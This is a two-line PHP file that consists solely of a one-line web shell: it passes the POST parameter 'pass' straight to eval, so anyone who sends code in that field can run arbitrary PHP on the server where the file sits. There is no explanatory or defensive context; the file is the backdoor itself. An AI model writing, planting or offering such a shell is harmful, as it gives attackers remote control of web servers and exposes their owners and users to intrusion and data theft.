<?php
eval($_POST["pass"]);
